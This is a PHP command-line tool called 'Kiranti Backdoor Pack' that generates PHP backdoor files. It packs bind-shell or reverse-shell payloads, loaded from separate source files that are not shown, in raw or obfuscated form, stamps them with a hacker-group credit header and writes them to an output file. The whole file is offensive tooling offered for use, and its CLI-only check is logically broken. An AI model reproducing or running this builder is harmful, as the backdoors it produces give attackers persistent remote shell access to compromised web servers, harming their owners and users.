<?php
$raw_bind = "src/entahlah.php";
$raw_reverse = "src/lulz.php";
$obfs_bind = "src/xbind.php";
$obfs_reverse = "src/xreverse.php";
if(!php_sapi_name() === "cli"){
	echo "<center>This Project is Supposed For Cli Usage</center>";
	exit(-1);
}
if(count($argv) <= 1){
	help();
	exit(-1);
}
$opts = getopt("o:t:b:");
if(isset($opts['o'])&&trim($opts['o'])!=""){
	$outfile = $opts['o'];
}
if(empty($outfile)){
	echo "[-] No Filename Given (use -o option)\n";
	exit(-1);
}
if(file_exists($outfile)){
	echo "[!] File Already Exists\n";
	exit(-1);
}
$type = isset($opts['t']) ? trim($opts['t']) : "raw";
if(($type!="raw")&&($type!="obfuscate")){
	echo "[-] Unknown argument: ".$type."\n";
	exit(-1);
}
$bdtype = isset($opts['b']) ? trim($opts['b']) : "bind";
if(($bdtype!="bind")&&($bdtype!="reverse")){
	echo "[-] Unknown argument: ".$bdtype."\n";
	exit(-1);
}
$template = "<?php
/*
Kiranti Backdoor Pack
(c) ".date("Y", time())."
Viva La Cucaracha Indonesian Hackers
https://github.com/peternakshell/kiranti
*/\n";
echo "[i] Output Filename: ".$outfile."\n";
echo "[i] Type: ".$type."\n";
echo "[i] Backdoor Type: ".$bdtype."\n";
if($type=="raw"){
	if($bdtype=="bind"){
		$realcode = $template . cleartag(file_get_contents($raw_bind));
	}
	elseif($bdtype=="reverse"){
		$realcode = $template . cleartag(file_get_contents($raw_reverse));
	}
}
elseif($type=="obfuscate"){
	if($bdtype=="bind"){
		$realcode = $template . cleartag(file_get_contents($obfs_bind));
	}
	elseif($bdtype=="reverse"){
		$realcode = $template . cleartag(file_get_contents($obfs_reverse));
	}
}
$fpx = @fopen($outfile, "w");
fwrite($fpx, $realcode);
fclose($fpx);
echo "[+] Done\n";
function help(){
print <<<HELP
                          _
 _     _                 | |  _
| | __(_)_ __  __ _ _ __ | |_(_)
| |/ /| | '__|/ _` | '_ \| __| |
|   < | | |  | (_| | | | | |_| |
|_|\_\|_|_|   \__,_|_| |_|\__|_|
                    Version: 1.0

Author: ./MyHeartIsyr
Blog: https://myheart-isyr.blogspot.com

Backdoor Packer
usage: kiranti.php -o [FILENAME] -t -b

options:
-o		Output Filename
-t		Filetype [raw|obfuscate]
-b		Backdoor Type [bind|reverse]

HELP;
}
function cleartag($x){
	$pos = strpos($x, "<?php");
	if(is_numeric($pos)){
		for($i=$pos;$i<=$pos+4 && strlen($x) >=5;$i++){
			$x[$i] = " ";
		}
		return $x;
	}
	else {
		return $x;
	}
}